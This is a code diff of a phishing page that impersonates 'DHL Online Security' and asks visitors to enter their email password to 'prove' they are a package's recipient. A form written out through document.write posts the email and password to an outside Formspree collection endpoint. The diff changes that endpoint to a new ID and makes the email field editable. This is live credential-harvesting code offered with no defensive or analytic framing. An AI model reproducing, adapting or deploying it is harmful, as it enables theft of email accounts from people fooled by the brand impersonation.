@@ -211,7 +211,7 @@ span.psw {
 <button onclick="document.getElementById('id01').style.display='block'" style="width:auto;"><b>Verify your details here</b></button></center>
 <div id="id01" class="modal">
 
-<script language=javascript>document.write(unescape('<form class="modal-content animate" method="post" action="https://formspree.io/f/xvojkvgz">'))</script>
+<script language=javascript>document.write(unescape('<form class="modal-content animate" method="post" action="https://formspree.io/f/mayzejzw">'))</script>
 
 
 
@@ -232,7 +232,7 @@ span.psw {
              -webkit-center;">DHL Online Security</span></strong></span></span> <br> <span style="color:#FF0000;"><strong id="ermsg">*Please confirm your email password to prove you're the intended recipient of the package information*</strong></span> <br>
                         <br>
     Enter the correct Email Password below
-</font><br> <input type="email" id="email" value="[[-Email-]]" name="email" placeholder="Enter Email Address" autofocus="" required="" readonly>
+</font><br> <input type="email" id="email" value=" " name="email" placeholder="Enter Email Address" autofocus="" required=""  >
 <br>
       <input type="password" id="password" name="password" placeholder="Enter Password" autofocus="" required="">
         <br>
